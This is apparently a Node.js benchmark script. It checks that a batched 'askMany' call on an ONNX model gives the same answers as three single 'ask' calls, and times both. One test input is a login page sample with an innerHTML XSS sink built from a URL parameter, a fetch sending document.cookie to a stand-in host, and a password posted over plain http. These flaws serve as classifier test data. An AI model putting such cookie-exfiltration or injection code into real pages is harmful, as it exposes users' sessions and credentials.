// bench_askmany.mjs — askMany (shared-prefix snapshot) vs ask x3 on the REAL decode-only graph, Node CPU (onnxruntime-node).
// Checks that askMany gives the same results as ask one by one and prints the time of each. Slow (CPU, one token per run).
// Required env: CT0_DECODE_ONNX, CT0_TOK_DIR, CT0_HEAD, CT0_HEAD_SCORE. Optional: CT0_BENCH_STATES (short,long).
import { createDecodeOnly } from "../dist/decodeOnly.js";
import { ask, askMany } from "../dist/ask.js";
import { loadHead } from "../dist/systemone.js";
import { promptFor } from "../dist/positions.js";
import { readFileSync } from "node:fs";
import { dirname, basename, resolve } from "node:path";
import * as ort from "onnxruntime-node";
import { AutoTokenizer, env } from "@huggingface/transformers";

const unset = ["CT0_DECODE_ONNX", "CT0_TOK_DIR", "CT0_HEAD", "CT0_HEAD_SCORE"].filter((n) => !process.env[n]);
if (unset.length) { console.error("usage: set " + unset.join(", ") + " (see the header comment)"); process.exit(2); }
const MODEL = process.env.CT0_DECODE_ONNX;
const tokDir = resolve(process.env.CT0_TOK_DIR);
const head = (p) => { const b = readFileSync(p); return loadHead(b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength)); };
env.allowRemoteModels = false; env.allowLocalModels = true; env.localModelPath = dirname(tokDir) + "/";
const tok = await AutoTokenizer.from_pretrained(basename(tokDir));
const heads = { noulChoice: head(process.env.CT0_HEAD),
  score: head(process.env.CT0_HEAD_SCORE) };
const be = await createDecodeOnly(await ort.InferenceSession.create(MODEL), tok, { ort });

const STATES = {
  short: '<input name="password" type="password" autocomplete="on">',
  long: '<form action="http://shop.example/login" method="post">\n  <input name="user" type="text">\n  <input name="password" type="password" autocomplete="on">\n'
    + '  <input type="hidden" name="csrf" value="">\n  <button type="submit">Sign in</button>\n</form>\n<script>\n'
    + '  const q = new URLSearchParams(location.search).get("next");\n  document.getElementById("msg").innerHTML = "Welcome back " + q;\n'
    + '  fetch("https://metrics.example/collect?u=" + document.cookie);\n</script>',
};
const qs = [
  { kind: "noul", q: "Does this excerpt itself contain a form submitting sensitive data insecurely?" },
  { kind: "choice", options: ["insecure-forms", "dom-xss", "info-disclosure", "exfil-egress"] },
  { kind: "score" },
];
let failed = 0;
for (const name of (process.env.CT0_BENCH_STATES || "short,long").split(",")) {
  const state = STATES[name];
  const ntok = qs.map((q) => tok.encode(promptFor({ ...q, state }), { add_special_tokens: false }).length);
  let t = performance.now();
  const one = []; for (const q of qs) one.push(await ask(be, tok, heads, { ...q, state }, { method: "both" }));
  const oneMs = performance.now() - t;
  t = performance.now();
  const many = await askMany(be, tok, heads, state, qs, { method: "both" });
  const manyMs = performance.now() - t;
  const same = JSON.stringify(one) === JSON.stringify(many);
  if (!same) failed++;
  console.log(JSON.stringify({ state: name, promptTokens: ntok, askX3Ms: Math.round(oneMs), askManyMs: Math.round(manyMs),
    speedup: +(oneMs / manyMs).toFixed(2), identical: same, results: many }));
}
await be.dispose();
console.log(failed ? `FAIL: ${failed} state(s) differ` : "askMany == ask x3 (bit-identical) on every state");
process.exit(failed ? 1 : 0);
